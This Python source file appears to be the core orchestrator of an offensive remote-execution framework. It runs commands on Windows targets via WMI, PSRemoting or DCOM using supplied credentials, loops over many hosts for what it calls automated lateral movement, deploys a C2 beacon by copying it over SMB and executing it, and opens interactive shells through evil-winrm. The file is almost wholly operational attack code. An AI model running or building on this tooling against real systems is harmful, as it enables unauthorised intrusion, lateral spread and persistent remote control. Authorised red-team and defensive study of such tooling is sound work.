"""
Core Remote Execution Framework
Main orchestrator for all remote execution operations
"""

import sys
from pathlib import Path
from typing import List, Optional

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from models import (
    Credential,
    ExecutionResult,
    MultiTargetResult,
    BeaconDeployResult,
    FrameworkConfig,
    ExecutionMethod
)
from ..methods import get_execution_method, get_beacon_deployer, list_methods
from ..methods.psremoting import PSRemotingExecutionMethod
from ..reports import ReportGenerator
from ..utils.output import output
from ..utils.files import ensure_directory


class RemoteExecutionFramework:
    """
    Main Remote Execution Framework

    Orchestrates remote command execution, multi-target operations,
    beacon deployment, and report generation.

    Usage:
        framework = RemoteExecutionFramework()

        # Single target execution
        result = framework.execute(
            target="192.168.1.100",
            credential=Credential("admin", password="Pass123"),
            command="whoami",
            method="wmi"
        )

        # Multi-target execution
        results = framework.execute_on_multiple(
            targets=["192.168.1.100", "192.168.1.101"],
            credential=Credential("admin", password="Pass123"),
            command="whoami",
            method="wmi"
        )

        # Deploy beacon
        result = framework.deploy_beacon(
            target="192.168.1.100",
            credential=Credential("admin", password="Pass123"),
            beacon_path="/tmp/beacon.exe",
            method="wmi"
        )

        # Interactive PSRemoting session
        framework.interactive_session(
            target="192.168.1.100",
            credential=Credential("admin", password="Pass123")
        )
    """

    def __init__(self, config: Optional[FrameworkConfig] = None):
        """
        Initialize framework

        Args:
            config: Optional configuration object
        """
        self.config = config or FrameworkConfig()
        self.output_dir = ensure_directory(self.config.output_dir)
        self.report = ReportGenerator(str(self.output_dir))

        output.success("Remote Execution Framework initialized")
        output.success(f"Output directory: {self.output_dir}")

    def execute(self, target: str, credential: Credential,
                command: str = "whoami", method: str = "wmi") -> ExecutionResult:
        """
        Execute command on single target

        Args:
            target: Target IP or hostname
            credential: Credential object with auth info
            command: Command to execute
            method: Execution method ('wmi', 'psremoting', 'dcom')

        Returns:
            ExecutionResult with execution details
        """
        exec_method = get_execution_method(method, timeout=self.config.timeout)
        result = exec_method.execute(target, credential, command)

        self.report.add_result(result)

        return result

    def execute_on_multiple(self, targets: List[str], credential: Credential,
                            command: str = "whoami",
                            method: str = "wmi") -> MultiTargetResult:
        """
        Execute command on multiple targets

        Automated lateral movement across multiple systems.

        Args:
            targets: List of target IPs/hostnames
            credential: Credential for all targets
            command: Command to execute
            method: Execution method

        Returns:
            MultiTargetResult with success/failure lists
        """
        output.banner("MULTI-TARGET EXECUTION")
        output.info(f"Targets: {len(targets)}")
        output.info(f"Command: {command}")
        output.info(f"Method: {method}")

        results = MultiTargetResult(total_targets=len(targets))
        exec_method = get_execution_method(method, timeout=self.config.timeout)

        for target in targets:
            output.newline()
            output.info(f"Executing on {target}...")

            result = exec_method.execute(target, credential, command)
            self.report.add_result(result)

            if result.success:
                results.successful.append({
                    'target': target,
                    'output': result.output
                })
            else:
                results.failed.append(target)

        # Print summary
        self.report.print_multi_target_summary(results)

        return results

    def deploy_beacon(self, target: str, credential: Credential,
                      beacon_path: str, method: str = "wmi") -> BeaconDeployResult:
        """
        Deploy C2 beacon to target

        Two-stage deployment:
            1. Copy beacon via SMB
            2. Execute via chosen method

        Args:
            target: Target IP or hostname
            credential: Credential for auth
            beacon_path: Local path to beacon file
            method: Execution method for running beacon

        Returns:
            BeaconDeployResult with deployment details
        """
        deployer = get_beacon_deployer(timeout=self.config.timeout)
        return deployer.deploy(target, credential, beacon_path, method)

    def interactive_session(self, target: str, credential: Credential) -> bool:
        """
        Start interactive PowerShell Remoting session

        Launches evil-winrm for full interactive PowerShell access.

        Args:
            target: Target IP or hostname
            credential: Credential (must have password)

        Returns:
            True if session completed normally
        """
        psremoting = PSRemotingExecutionMethod(timeout=self.config.timeout)
        return psremoting.interactive_session(target, credential)

    def generate_report(self) -> None:
        """Generate and save final report"""
        self.report.print_summary()
        self.report.save_json()

    @staticmethod
    def available_methods() -> List[str]:
        """Get list of available execution methods"""
        return list_methods()